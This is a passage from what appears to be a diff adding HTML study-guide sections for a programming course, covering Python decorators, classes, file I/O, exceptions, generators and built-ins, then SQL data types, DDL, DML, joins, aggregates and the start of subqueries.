+
+# Decorators
+def timer(func):
+    import time
+    def wrapper(*args, **kwargs):
+        start = time.time()
+        result = func(*args, **kwargs)
+        end = time.time()
+        print(f"{func.__name__} took {end-start:.4f}s")
+        return result
+    return wrapper
+
+@timer
+def slow_function():
+    import time
+    time.sleep(1)
+
+# functools.wraps — preserve metadata
+from functools import wraps
+def my_decorator(func):
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        print("Before")
+        result = func(*args, **kwargs)
+        print("After")
+        return result
+    return wrapper
+
+# Closures
+def make_multiplier(factor):
+    def multiplier(n):
+        return n * factor
+    return multiplier
+
+triple = make_multiplier(3)
+triple(5)   # 15
+
+# functools utilities
+from functools import partial, reduce, lru_cache
+
+# Partial: fix some arguments
+power_of_2 = partial(pow, 2)
+power_of_2(10)   # 1024
+
+# reduce
+product = reduce(lambda acc, x: acc * x, [1,2,3,4,5])  # 120
+
+# Memoization
+@lru_cache(maxsize=None)
+def fib(n):
+    if n &lt; 2: return n
+    return fib(n-1) + fib(n-2)
+</code></pre>
+
+`,
+  "study-guide-python-12": `
+<h2>12. Object-Oriented Programming</h2>
+<pre><code>class Animal:
+    # Class variable (shared)
+    kingdom = "Animalia"
+    _count = 0
+
+    def __init__(self, name: str, sound: str):
+        """Constructor"""
+        self.name = name          # Public instance variable
+        self._sound = sound       # Protected (convention)
+        self.__id = Animal._count # Private (name-mangled)
+        Animal._count += 1
+
+    # Instance method
+    def speak(self) -&gt; str:
+        return f"{self.name} says {self._sound}!"
+
+    # Property (getter)
+    @property
+    def sound(self) -&gt; str:
+        return self._sound
+
+    # Property setter
+    @sound.setter
+    def sound(self, value: str):
+        if not value:
+            raise ValueError("Sound cannot be empty")
+        self._sound = value
+
+    # Property deleter
+    @sound.deleter
+    def sound(self):
+        self._sound = ""
+
+    # Class method
+    @classmethod
+    def get_count(cls) -&gt; int:
+        return cls._count
+
+    @classmethod
+    def from_dict(cls, data: dict):
+        """Alternative constructor"""
+        return cls(data["name"], data["sound"])
+
+    # Static method (no self/cls)
+    @staticmethod
+    def describe() -&gt; str:
+        return "Animals are multicellular organisms"
+
+    # Magic/dunder methods
+    def __str__(self) -&gt; str:       # str(obj)
+        return f"Animal({self.name})"
+
+    def __repr__(self) -&gt; str:      # repr(obj) — developer view
+        return f"Animal(name={self.name!r}, sound={self._sound!r})"
+
+    def __len__(self) -&gt; int:
+        return len(self.name)
+
+    def __eq__(self, other) -&gt; bool:
+        if not isinstance(other, Animal):
+            return NotImplemented
+        return self.name == other.name
+
+    def __lt__(self, other) -&gt; bool:
+        return self.name &lt; other.name
+
+    def __hash__(self):
+        return hash(self.name)
+
+    def __bool__(self):
+        return bool(self.name)
+
+    def __contains__(self, item):    # "x" in obj
+        return item in self.name
+
+    def __iter__(self):              # for x in obj
+        return iter(self.name)
+
+    def __getitem__(self, index):    # obj[index]
+        return self.name[index]
+
+    def __add__(self, other):        # obj + other
+        return Animal(self.name + other.name, self._sound)
+
+    def __call__(self, *args):       # obj()
+        return self.speak()
+
+
+class Dog(Animal):
+    """Inherits from Animal."""
+
+    def __init__(self, name: str, breed: str):
+        super().__init__(name, "Woof")  # Call parent __init__
+        self.breed = breed
+        self.tricks = []
+
+    def learn_trick(self, trick: str):
+        self.tricks.append(trick)
+        return self  # Enable method chaining
+
+    def perform(self) -&gt; list:
+        return [f"{self.name}: {t}" for t in self.tricks]
+
+    def speak(self) -&gt; str:         # Override parent method
+        base = super().speak()      # Call parent method
+        return f"{base} *tail wagging*"
+
+
+class Cat(Animal):
+    def __init__(self, name: str, indoor: bool = True):
+        super().__init__(name, "Meow")
+        self.indoor = indoor
+
+
+# Multiple inheritance
+class Labrador(Dog):
+    pass
+
+class ServiceDog(Dog):
+    def __init__(self, name: str, breed: str, task: str):
+        super().__init__(name, breed)
+        self.task = task
+
+
+# Abstract base classes
+from abc import ABC, abstractmethod
+
+class Shape(ABC):
+    @abstractmethod
+    def area(self) -&gt; float:
+        pass
+
+    @abstractmethod
+    def perimeter(self) -&gt; float:
+        pass
+
+    def describe(self) -&gt; str:
+        return f"Area: {self.area():.2f}, Perimeter: {self.perimeter():.2f}"
+
+class Circle(Shape):
+    def __init__(self, radius: float):
+        self.radius = radius
+
+    def area(self) -&gt; float:
+        return math.pi * self.radius ** 2
+
+    def perimeter(self) -&gt; float:
+        return 2 * math.pi * self.radius
+
+
+# Dataclasses (Python 3.7+)
+from dataclasses import dataclass, field
+from typing import List
+
+@dataclass
+class User:
+    name: str
+    age: int
+    email: str = ""
+    roles: List[str] = field(default_factory=list)
+
+    def __post_init__(self):
+        self.email = self.email or f"{self.name.lower()}@example.com"
+
+# Auto-generates __init__, __repr__, __eq__
+user = User("Alice", 25)
+user2 = User("Alice", 25)
+user == user2    # True (value comparison)
+</code></pre>
+
+`,
+  "study-guide-python-13": `
+<h2>13. File I/O</h2>
+<pre><code># Writing a file
+with open("file.txt", "w", encoding="utf-8") as f:
+    f.write("Hello, World!\\n")
+    f.write("Second line\\n")
+
+# Append
+with open("file.txt", "a") as f:
+    f.write("Appended line\\n")
+
+# Reading a file
+with open("file.txt", "r", encoding="utf-8") as f:
+    content = f.read()        # Entire file as string
+    lines = f.readlines()     # List of lines (with \\n)
+    line = f.readline()       # One line at a time
+
+# Iterate efficiently (line by line, no loading all into memory)
+with open("large_file.txt") as f:
+    for line in f:
+        process(line.rstrip())
+
+# File modes
+# "r"   Read (default)
+# "w"   Write (overwrite)
+# "a"   Append
+# "x"   Exclusive create (fails if exists)
+# "b"   Binary mode
+# "t"   Text mode (default)
+# "+"   Read+Write (r+ or w+)
+
+# Binary files
+with open("image.jpg", "rb") as f:
+    data = f.read()
+
+with open("copy.jpg", "wb") as f:
+    f.write(data)
+
+# JSON
+import json
+data = {"name": "Alice", "scores": [95, 87, 92]}
+
+# Write JSON
+with open("data.json", "w") as f:
+    json.dump(data, f, indent=2, ensure_ascii=False)
+
+# Read JSON
+with open("data.json") as f:
+    loaded = json.load(f)
+
+# JSON to/from string
+json_str = json.dumps(data)
+parsed = json.loads(json_str)
+
+# CSV
+import csv
+
+# Write CSV
+with open("data.csv", "w", newline="") as f:
+    writer = csv.DictWriter(f, fieldnames=["name", "age"])
+    writer.writeheader()
+    writer.writerows([{"name":"Alice","age":25}, {"name":"Bob","age":30}])
+
+# Read CSV
+with open("data.csv") as f:
+    reader = csv.DictReader(f)
+    for row in reader:
+        print(row["name"], row["age"])
+
+# pathlib (modern file system handling)
+from pathlib import Path
+
+p = Path(".")                    # Current directory
+p = Path("/home/user/docs")
+p = Path.home()                  # Home directory
+p = Path.cwd()                   # Current working directory
+
+p / "subdir" / "file.txt"        # Join paths
+p.name         # "file.txt"
+p.stem         # "file"
+p.suffix       # ".txt"
+p.suffixes     # ['.tar', '.gz']
+p.parent       # Parent directory
+
+p.exists()
+p.is_file()
+p.is_dir()
+p.mkdir(parents=True, exist_ok=True)
+p.rmdir()
+p.unlink()     # Delete file
+p.rename(new_path)
+p.stat().st_size   # File size in bytes
+
+# Glob patterns
+list(p.glob("*.py"))         # All .py files in dir
+list(p.rglob("*.py"))        # Recursive
+
+# Read/write text
+p.read_text(encoding="utf-8")
+p.write_text("content", encoding="utf-8")
+p.read_bytes()
+p.write_bytes(b"data")
+
+# List directory contents
+for item in p.iterdir():
+    print(item)
+</code></pre>
+
+`,
+  "study-guide-python-14": `
+<h2>14. Exception Handling</h2>
+<pre><code># try / except / else / finally
+try:
+    result = 10 / 0
+    data = json.loads("invalid")
+except ZeroDivisionError as e:
+    print(f"Division error: {e}")
+except (ValueError, TypeError) as e:
+    print(f"Value/Type error: {e}")
+except Exception as e:
+    print(f"Unexpected error: {type(e).__name__}: {e}")
+    raise    # Re-raise the exception
+else:
+    # Runs ONLY if no exception occurred
+    print(f"Result: {result}")
+finally:
+    # ALWAYS runs (cleanup)
+    print("Done")
+
+# Common exceptions
+# BaseException
+#   SystemExit          sys.exit() called
+#   KeyboardInterrupt   Ctrl+C
+#   Exception
+#     ArithmeticError
+#       ZeroDivisionError
+#       OverflowError
+#     LookupError
+#       IndexError      List out of range
+#       KeyError        Dict key not found
+#     NameError         Variable not defined
+#     TypeError         Wrong type
+#     ValueError        Right type, wrong value
+#     FileNotFoundError No such file
+#     PermissionError   No permission
+#     RuntimeError
+#     StopIteration     Iterator exhausted
+#     MemoryError
+
+# Custom exceptions
+class AppError(Exception):
+    """Base application error."""
+    pass
+
+class ValidationError(AppError):
+    def __init__(self, message: str, field: str = ""):
+        super().__init__(message)
+        self.field = field
+
+class NotFoundError(AppError):
+    def __init__(self, resource: str, id):
+        super().__init__(f"{resource} with id {id} not found")
+        self.resource = resource
+        self.id = id
+
+# Context managers (with statement)
+class DatabaseConnection:
+    def __enter__(self):
+        self.conn = connect_to_db()
+        return self.conn
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        self.conn.close()
+        return False  # Don't suppress exceptions
+
+with DatabaseConnection() as conn:
+    conn.execute(query)
+
+# contextlib
+from contextlib import contextmanager
+
+@contextmanager
+def timer():
+    import time
+    start = time.time()
+    try:
+        yield
+    finally:
+        print(f"Elapsed: {time.time() - start:.4f}s")
+
+with timer():
+    slow_operation()
+</code></pre>
+
+`,
+  "study-guide-python-15": `
+<h2>15. Iterators, Generators, and Comprehensions</h2>
+<pre><code># Iterators
+class CountUp:
+    def __init__(self, start, end):
+        self.current = start
+        self.end = end
+
+    def __iter__(self):
+        return self
+
+    def __next__(self):
+        if self.current &gt; self.end:
+            raise StopIteration
+        value = self.current
+        self.current += 1
+        return value
+
+for n in CountUp(1, 5):
+    print(n)   # 1 2 3 4 5
+
+# Generators (lazy iterators)
+def count_up(start, end):
+    for i in range(start, end + 1):
+        yield i          # Suspends here, resumes next time
+
+gen = count_up(1, 5)
+next(gen)   # 1
+next(gen)   # 2
+
+def fibonacci():
+    a, b = 0, 1
+    while True:
+        yield a
+        a, b = b, a + b
+
+fib = fibonacci()
+[next(fib) for _ in range(10)]   # [0,1,1,2,3,5,8,13,21,34]
+
+# yield from
+def chain(*iterables):
+    for iterable in iterables:
+        yield from iterable
+
+def infinite_counter(start=0):
+    while True:
+        yield start
+        start += 1
+
+# Generator expressions
+squares_gen = (x**2 for x in range(10))  # Use () not []
+sum(x**2 for x in range(10))    # More efficient than list comprehension
+big_files = (f for f in Path(".").rglob("*") if f.stat().st_size &gt; 1e6)
+
+# Comprehensions summary
+lst = [expr for item in iterable if condition]        # List
+dct = {k: v for k, v in iterable if condition}        # Dict
+st  = {expr for item in iterable if condition}        # Set
+gen = (expr for item in iterable if condition)        # Generator
+
+# Built-in itertools
+import itertools
+
+itertools.count(10, 2)          # 10, 12, 14, 16, ... (infinite)
+itertools.cycle([1,2,3])        # 1, 2, 3, 1, 2, 3, ... (infinite)
+itertools.repeat(x, n)         # x, x, x, ... (n times)
+
+itertools.chain([1,2], [3,4])   # 1, 2, 3, 4
+itertools.chain.from_iterable([[1,2],[3,4]])
+itertools.islice(gen, 5)        # First 5 from generator
+itertools.takewhile(lambda x: x&lt;5, count)
+itertools.dropwhile(lambda x: x&lt;5, count)
+itertools.filterfalse(pred, iterable)
+
+itertools.combinations([1,2,3,4], 2)     # (1,2),(1,3),(1,4),(2,3),...
+itertools.permutations([1,2,3], 2)       # All ordered pairs
+itertools.product([1,2], [3,4])          # (1,3),(1,4),(2,3),(2,4)
+itertools.combinations_with_replacement
+
+itertools.groupby(sorted_data, key=fn)
+itertools.zip_longest([1,2,3], [4,5], fillvalue=0)
+itertools.starmap(fn, [(1,2),(3,4)])
+itertools.accumulate([1,2,3,4], lambda x,y: x*y)  # Running product
+</code></pre>
+
+`,
+  "study-guide-python-16": `
+<h2>16. Common Built-in Functions</h2>
+<pre><code># Type constructors
+int(), float(), str(), bool(), list(), tuple(), dict(), set(), frozenset()
+bytes(), bytearray(), complex()
+
+# Math
+abs(-5)       # 5
+divmod(10,3)  # (3,1)
+pow(2,10)     # 1024
+round(3.14,1) # 3.1
+max(1,5,3)    # 5; max([1,5,3]) same
+min(1,5,3)    # 1
+sum([1,2,3])  # 6
+
+# Sequences
+len([1,2,3])
+range(10), range(2,10), range(0,10,2)
+reversed([1,2,3])
+sorted([3,1,2])
+sorted(words, key=str.lower)
+enumerate(lst, start=0)
+zip(lst1, lst2, lst3)
+zip(*matrix)    # Transpose
+filter(pred, iterable)
+map(func, iterable)
+map(func, lst1, lst2)   # Two inputs
+
+# Functional
+all([True, True, False])  # False
+any([False, False, True]) # True
+
+# I/O
+print("Hello", "World", sep="-", end="!")
+input("Enter: ")
+open(file, mode)
+
+# Object
+id(obj)           # Memory address
+hash(obj)
+dir(obj)          # List attributes/methods
+vars(obj)         # __dict__
+help(obj)         # Documentation
+repr(obj)
+isinstance(obj, cls)
+issubclass(Dog, Animal)
+callable(obj)     # Is it callable?
+getattr(obj, "name")
+setattr(obj, "name", "Bob")
+delattr(obj, "name")
+hasattr(obj, "name")
+
+# Conversion
+ord("A")          # 65
+chr(65)           # "A"
+bin(255)          # "0b11111111"
+oct(255)          # "0o377"
+hex(255)          # "0xff"
+
+# Other
+iter(iterable)
+next(iterator)
+next(iterator, default)
+eval("2 + 2")     # 4 (dangerous with user input!)
+exec("x = 5")
+compile(src, "&lt;string&gt;", "exec")
+__import__("json")
+globals()
+locals()
+format(value, spec)
+f"{42:08b}"       # "00101010"
+</code></pre>
+
+`,
+  "study-guide-python-17": `
+<h2>17. Python Interview Questions</h2>
+<p><strong>Q: What is the GIL?</strong>
+A: The Global Interpreter Lock is a mutex that allows only one thread to execute Python bytecode at a time. This limits CPU-bound multi-threading but doesn't affect I/O-bound threads or multiprocessing.</p>
+<p><strong>Q: What is the difference between a list and a tuple?</strong>
+A: Lists are mutable (can be changed); tuples are immutable. Tuples are faster, use less memory, and can be used as dictionary keys (they're hashable).</p>
+<p><strong>Q: What are generators and why use them?</strong>
+A: Functions using <code>yield</code> to produce values lazily on demand. They're memory-efficient because they don't store the entire sequence in memory — they compute values one at a time.</p>
+<p><strong>Q: Explain <code>*args</code> and \`</strong>kwargs<code>.**
+A:</code><em>args<code>collects extra positional arguments into a tuple.</code>*</em>kwargs\` collects extra keyword arguments into a dictionary. Used to create flexible functions accepting variable inputs.</p>
+<p><strong>Q: What is a decorator?</strong>
+A: A function that takes another function and extends/modifies its behavior. Implemented as a higher-order function and applied with the <code>@</code> syntax.</p>
+<p><strong>Q: What is the difference between <code>is</code> and <code>==</code>?</strong>
+A: <code>==</code> compares values (equality). <code>is</code> compares identity (same object in memory). <code>None</code> should always be compared with <code>is None</code>, not <code>== None</code>.</p>
+<p><strong>Q: What are list comprehensions and when should you use them?</strong>
+A: Concise syntax for creating lists: <code>[expr for item in iterable if cond]</code>. Use for simple transformations and filters. For complex logic, use a regular loop for readability.</p>
+
+<p><em>End of Python Study Guide</em></p>
+
+`,
+  "study-guide-sql-01": `
+<h2>1. What Is SQL?</h2>
+<p>SQL (Structured Query Language) is the standard language for managing and manipulating <strong>relational databases</strong>. It is declarative — you describe <strong>what</strong> you want, not <strong>how</strong> to get it.</p>
+<p>Major dialects: MySQL, PostgreSQL, SQLite, Microsoft SQL Server (T-SQL), Oracle (PL/SQL). Core SQL is standardized (ANSI SQL); each RDBMS adds extensions.</p>
+<p>Key concepts: tables (rows and columns), schemas, relationships, constraints, indexes, transactions, views, stored procedures.</p>
+
+`,
+  "study-guide-sql-02": `
+<h2>2. Database Concepts</h2>
+<h3>Relational Database Terms</h3>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Database</td>
+<td>Collection of related tables</td>
+</tr>
+<tr>
+<td>Table (Relation)</td>
+<td>2D structure of rows (records) and columns (fields)</td>
+</tr>
+<tr>
+<td>Row (Record/Tuple)</td>
+<td>Single data entry</td>
+</tr>
+<tr>
+<td>Column (Field/Attribute)</td>
+<td>Category of data with a specific type</td>
+</tr>
+<tr>
+<td>Primary Key</td>
+<td>Uniquely identifies each row; no NULLs</td>
+</tr>
+<tr>
+<td>Foreign Key</td>
+<td>References a primary key in another table</td>
+</tr>
+<tr>
+<td>Schema</td>
+<td>Blueprint/structure of a database</td>
+</tr>
+<tr>
+<td>Index</td>
+<td>Data structure speeding up queries</td>
+</tr>
+<tr>
+<td>View</td>
+<td>Virtual table based on a query</td>
+</tr>
+<tr>
+<td>NULL</td>
+<td>Absence of a value (not 0, not "")</td>
+</tr>
+<tr>
+<td>Transaction</td>
+<td>Group of operations treated as one unit</td>
+</tr>
+</tbody>
+</table>
+<h3>ACID Properties</h3>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>A</strong>tomicity</td>
+<td>All operations succeed, or none do</td>
+</tr>
+<tr>
+<td><strong>C</strong>onsistency</td>
+<td>Database stays in valid state</td>
+</tr>
+<tr>
+<td><strong>I</strong>solation</td>
+<td>Concurrent transactions don't interfere</td>
+</tr>
+<tr>
+<td><strong>D</strong>urability</td>
+<td>Committed transactions survive crashes</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-sql-03": `
+<h2>3. Data Types</h2>
+<h3>Common SQL Data Types</h3>
+<pre><code>-- Numeric
+INT / INTEGER          -- Whole numbers (-2B to 2B)
+BIGINT                 -- Large whole numbers
+SMALLINT               -- Small whole numbers
+DECIMAL(p, s)          -- Exact: p=total digits, s=decimal places
+NUMERIC(p, s)          -- Same as DECIMAL
+FLOAT                  -- Approximate floating point
+REAL                   -- Single precision float
+BOOLEAN / BOOL         -- TRUE/FALSE (some DBs use TINYINT)
+
+-- String
+CHAR(n)                -- Fixed-length (padded with spaces)
+VARCHAR(n)             -- Variable-length up to n
+TEXT                   -- Unlimited length text
+NVARCHAR(n)            -- Unicode variable-length
+
+-- Date/Time
+DATE                   -- YYYY-MM-DD
+TIME                   -- HH:MM:SS
+DATETIME               -- YYYY-MM-DD HH:MM:SS
+TIMESTAMP              -- Like DATETIME, often auto-updates
+YEAR                   -- YYYY
+
+-- Binary
+BLOB                   -- Binary Large Object
+BINARY(n)              -- Fixed binary
+VARBINARY(n)           -- Variable binary
+
+-- Other
+JSON                   -- JSON document (MySQL 5.7+, PostgreSQL)
+UUID                   -- Universally Unique Identifier
+ENUM('a','b','c')      -- Fixed set of values
+ARRAY                  -- PostgreSQL arrays
+</code></pre>
+
+`,
+  "study-guide-sql-04": `
+<h2>4. DDL — Data Definition Language</h2>
+<p>DDL commands define and modify the database <strong>structure</strong>.</p>
+<h3>CREATE TABLE</h3>
+<pre><code>CREATE TABLE users (
+    -- Auto-increment primary key (MySQL)
+    id         INT AUTO_INCREMENT PRIMARY KEY,
+    -- PostgreSQL: SERIAL or GENERATED ALWAYS AS IDENTITY
+
+    -- String columns
+    username   VARCHAR(50)  NOT NULL UNIQUE,
+    email      VARCHAR(255) NOT NULL,
+    full_name  VARCHAR(100),
+    bio        TEXT,
+
+    -- Numeric
+    age        SMALLINT     CHECK (age &gt;= 0 AND age &lt;= 150),
+    balance    DECIMAL(10, 2) DEFAULT 0.00,
+
+    -- Boolean (MySQL uses TINYINT(1))
+    is_active  BOOLEAN       DEFAULT TRUE,
+    is_verified BOOLEAN      DEFAULT FALSE,
+
+    -- Date/time
+    birthdate  DATE,
+    created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
+    updated_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+
+    -- Constraints
+    CONSTRAINT chk_email CHECK (email LIKE '%@%.%'),
+    CONSTRAINT unique_email UNIQUE (email)
+);
+
+CREATE TABLE posts (
+    id         INT AUTO_INCREMENT PRIMARY KEY,
+    user_id    INT          NOT NULL,
+    title      VARCHAR(200) NOT NULL,
+    content    TEXT,
+    views      INT          DEFAULT 0,
+    published  BOOLEAN      DEFAULT FALSE,
+    created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
+
+    -- Foreign key constraint
+    CONSTRAINT fk_posts_user FOREIGN KEY (user_id)
+        REFERENCES users(id)
+        ON DELETE CASCADE       -- Delete posts when user deleted
+        ON UPDATE CASCADE       -- Update FK when PK changes
+);
+
+CREATE TABLE tags (
+    id   INT AUTO_INCREMENT PRIMARY KEY,
+    name VARCHAR(50) NOT NULL UNIQUE
+);
+
+-- Junction table (many-to-many)
+CREATE TABLE post_tags (
+    post_id INT NOT NULL,
+    tag_id  INT NOT NULL,
+    PRIMARY KEY (post_id, tag_id),  -- Composite primary key
+    FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
+    FOREIGN KEY (tag_id)  REFERENCES tags(id)  ON DELETE CASCADE
+);
+</code></pre>
+<h3>ALTER TABLE</h3>
+<pre><code>-- Add column
+ALTER TABLE users ADD COLUMN phone VARCHAR(20);
+ALTER TABLE users ADD COLUMN role VARCHAR(20) DEFAULT 'user' AFTER email;
+
+-- Modify column
+ALTER TABLE users MODIFY COLUMN full_name VARCHAR(200) NOT NULL;
+ALTER TABLE users CHANGE COLUMN full_name display_name VARCHAR(200);
+
+-- Drop column
+ALTER TABLE users DROP COLUMN phone;
+
+-- Add constraint
+ALTER TABLE users ADD CONSTRAINT chk_age CHECK (age &gt;= 0);
+ALTER TABLE users ADD INDEX idx_email (email);
+ALTER TABLE users ADD UNIQUE (username);
+
+-- Drop constraint
+ALTER TABLE users DROP CONSTRAINT chk_age;
+ALTER TABLE users DROP INDEX idx_email;
+
+-- Rename table
+ALTER TABLE users RENAME TO app_users;
+RENAME TABLE old_name TO new_name;  -- MySQL
+</code></pre>
+<h3>DROP and TRUNCATE</h3>
+<pre><code>-- Drop table (structure + data)
+DROP TABLE IF EXISTS posts;
+
+-- Drop database
+DROP DATABASE IF EXISTS my_database;
+
+-- Truncate (remove all data, keep structure)
+TRUNCATE TABLE logs;    -- Much faster than DELETE; resets auto-increment
+
+-- CREATE DATABASE
+CREATE DATABASE my_app
+    CHARACTER SET utf8mb4
+    COLLATE utf8mb4_unicode_ci;
+
+USE my_app;
+</code></pre>
+<h3>Indexes</h3>
+<pre><code>-- Single column index
+CREATE INDEX idx_username ON users (username);
+
+-- Composite index (order matters — leftmost prefix rule)
+CREATE INDEX idx_user_date ON posts (user_id, created_at);
+
+-- Unique index
+CREATE UNIQUE INDEX idx_email ON users (email);
+
+-- Full-text index (MySQL)
+CREATE FULLTEXT INDEX idx_content ON posts (title, content);
+
+-- Partial index (PostgreSQL)
+CREATE INDEX idx_active_users ON users (email) WHERE is_active = TRUE;
+
+-- Drop index
+DROP INDEX idx_username ON users;   -- MySQL
+DROP INDEX idx_username;            -- PostgreSQL
+</code></pre>
+
+`,
+  "study-guide-sql-05": `
+<h2>5. DML — Data Manipulation Language</h2>
+<h3>INSERT</h3>
+<pre><code>-- Single row
+INSERT INTO users (username, email, age)
+VALUES ('alice', 'alice@example.com', 25);
+
+-- Multiple rows (much more efficient than multiple INSERTs)
+INSERT INTO users (username, email, age) VALUES
+    ('bob', 'bob@example.com', 30),
+    ('carol', 'carol@example.com', 28),
+    ('dave', 'dave@example.com', 35);
+
+-- Insert from SELECT
+INSERT INTO archive_users (username, email, created_at)
+SELECT username, email, created_at
+FROM users
+WHERE created_at &lt; '2020-01-01';
+
+-- Insert or ignore on duplicate
+INSERT IGNORE INTO users (username, email) VALUES ('alice', 'alice@example.com');
+
+-- Upsert (insert or update)
+INSERT INTO users (id, username, email)
+VALUES (1, 'alice', 'newalice@example.com')
+ON DUPLICATE KEY UPDATE email = VALUES(email);  -- MySQL
+
+-- PostgreSQL upsert
+INSERT INTO users (id, username, email)
+VALUES (1, 'alice', 'newalice@example.com')
+ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email;
+
+ON CONFLICT (id) DO NOTHING;
+</code></pre>
+<h3>SELECT</h3>
+<pre><code>-- Basic
+SELECT * FROM users;                           -- All columns (avoid in production)
+SELECT id, username, email FROM users;         -- Specific columns
+SELECT DISTINCT country FROM users;            -- Unique values only
+SELECT username AS name, email AS contact FROM users;  -- Aliases
+
+-- Expressions
+SELECT 
+    username,
+    age,
+    age * 12 AS age_months,
+    UPPER(email) AS email_upper,
+    CONCAT(first_name, ' ', last_name) AS full_name,
+    ROUND(score, 2) AS rounded_score,
+    COALESCE(phone, email, 'No contact') AS contact  -- First non-NULL
+FROM users;
+
+-- Conditional columns
+SELECT username,
+    CASE 
+        WHEN age &lt; 18 THEN 'Minor'
+        WHEN age &lt; 65 THEN 'Adult'
+        ELSE 'Senior'
+    END AS age_group,
+    IF(is_active, 'Active', 'Inactive') AS status   -- MySQL only
+FROM users;
+
+-- WHERE clause
+SELECT * FROM users WHERE age &gt; 25;
+SELECT * FROM users WHERE age BETWEEN 18 AND 65;     -- Inclusive
+SELECT * FROM users WHERE age NOT BETWEEN 18 AND 65;
+SELECT * FROM users WHERE email IN ('a@b.com', 'c@d.com');
+SELECT * FROM users WHERE email NOT IN ('a@b.com');
+SELECT * FROM users WHERE email IS NULL;
+SELECT * FROM users WHERE email IS NOT NULL;
+SELECT * FROM users WHERE username LIKE 'a%';    -- Starts with 'a'
+SELECT * FROM users WHERE username LIKE '%son';  -- Ends with 'son'
+SELECT * FROM users WHERE username LIKE '%ali%'; -- Contains 'ali'
+SELECT * FROM users WHERE username LIKE '_ob';   -- Any single char, then 'ob'
+SELECT * FROM users WHERE username REGEXP '^[A-Z]';  -- Regex (MySQL)
+
+-- Logical operators
+WHERE age &gt; 25 AND is_active = TRUE
+WHERE age &lt; 18 OR age &gt; 65
+WHERE NOT is_active
+WHERE (age &gt; 25 OR role = 'admin') AND is_active = TRUE
+
+-- ORDER BY
+SELECT * FROM users ORDER BY age;                    -- Ascending (default)
+SELECT * FROM users ORDER BY age DESC;               -- Descending
+SELECT * FROM users ORDER BY age DESC, username ASC; -- Multiple columns
+SELECT * FROM users ORDER BY RAND();                 -- Random order (MySQL)
+
+-- LIMIT and OFFSET
+SELECT * FROM users LIMIT 10;              -- First 10 rows
+SELECT * FROM users LIMIT 10 OFFSET 20;   -- Rows 21-30 (pagination)
+SELECT * FROM users LIMIT 20, 10;         -- MySQL shorthand: offset, count
+</code></pre>
+
+`,
+  "study-guide-sql-06": `
+<h2>6. JOINs</h2>
+<pre><code>-- Sample tables
+-- users: id, username
+-- orders: id, user_id, amount, date
+
+-- INNER JOIN: only matching rows in both tables
+SELECT u.username, o.amount, o.date
+FROM users u
+INNER JOIN orders o ON u.id = o.user_id;
+
+-- LEFT JOIN: all from left, matching from right (NULL if no match)
+SELECT u.username, COUNT(o.id) AS order_count
+FROM users u
+LEFT JOIN orders o ON u.id = o.user_id
+GROUP BY u.id, u.username;
+
+-- RIGHT JOIN: all from right, matching from left
+SELECT u.username, o.amount
+FROM users u
+RIGHT JOIN orders o ON u.id = o.user_id;
+
+-- FULL OUTER JOIN: all from both tables
+-- MySQL doesn't support FULL OUTER JOIN directly — use UNION
+SELECT u.username, o.amount
+FROM users u LEFT JOIN orders o ON u.id = o.user_id
+UNION
+SELECT u.username, o.amount
+FROM users u RIGHT JOIN orders o ON u.id = o.user_id;
+
+-- PostgreSQL:
+SELECT u.username, o.amount
+FROM users u
+FULL OUTER JOIN orders o ON u.id = o.user_id;
+
+-- CROSS JOIN: every combination (Cartesian product)
+SELECT u.username, s.size
+FROM users u
+CROSS JOIN sizes s;
+
+-- SELF JOIN: join table to itself
+SELECT 
+    e.name AS employee,
+    m.name AS manager
+FROM employees e
+LEFT JOIN employees m ON e.manager_id = m.id;
+
+-- Multiple JOINs
+SELECT 
+    u.username,
+    p.title,
+    t.name AS tag
+FROM users u
+JOIN posts p ON u.id = p.user_id
+JOIN post_tags pt ON p.id = pt.post_id
+JOIN tags t ON pt.tag_id = t.id
+WHERE u.is_active = TRUE
+ORDER BY p.created_at DESC;
+</code></pre>
+
+`,
+  "study-guide-sql-07": `
+<h2>7. Aggregate Functions and GROUP BY</h2>
+<pre><code>-- Aggregate functions ignore NULL
+SELECT 
+    COUNT(*)        AS total_rows,      -- Counts all rows
+    COUNT(email)    AS has_email,       -- Counts non-NULL
+    COUNT(DISTINCT country) AS countries,
+    SUM(balance)    AS total_balance,
+    AVG(age)        AS avg_age,
+    MAX(age)        AS max_age,
+    MIN(age)        AS min_age,
+    STD(age)        AS std_dev          -- MySQL
+FROM users;
+
+-- GROUP BY
+SELECT 
+    country,
+    COUNT(*) AS user_count,
+    AVG(age) AS avg_age,
+    SUM(balance) AS total_balance
+FROM users
+GROUP BY country;
+
+-- GROUP BY multiple columns
+SELECT year, month, SUM(revenue)
+FROM sales
+GROUP BY year, month
+ORDER BY year, month;
+
+-- HAVING (filter groups — like WHERE but for aggregates)
+SELECT country, COUNT(*) AS count
+FROM users
+GROUP BY country
+HAVING count &gt; 10          -- Only countries with more than 10 users
+HAVING COUNT(*) &gt; 10;      -- Same (must use aggregate, not alias in standard SQL)
+
+-- WHERE vs HAVING
+SELECT department, AVG(salary)
+FROM employees
+WHERE is_active = TRUE          -- Filter rows BEFORE grouping
+GROUP BY department
+HAVING AVG(salary) &gt; 50000;    -- Filter groups AFTER aggregating
+
+-- GROUP BY with ROLLUP (subtotals)
+SELECT country, city, SUM(sales)
+FROM data
+GROUP BY country, city WITH ROLLUP;
+
+-- GROUPING SETS, CUBE (PostgreSQL / SQL Server)
+GROUP BY GROUPING SETS ((country, city), (country), ());
+</code></pre>
+
+`,
+  "study-guide-sql-08": `
+<h2>8. Subqueries</h2>
+<pre><code>-- Scalar subquery (returns single value)
+SELECT username
+FROM users
+WHERE age = (SELECT MAX(age) FROM users);
+
+-- Row subquery
+SELECT *
+FROM users
+WHERE (age, country) = (SELECT age, country FROM vip_users WHERE id = 1);
+
+-- Column subquery with IN
+SELECT username
+FROM users
+WHERE id IN (
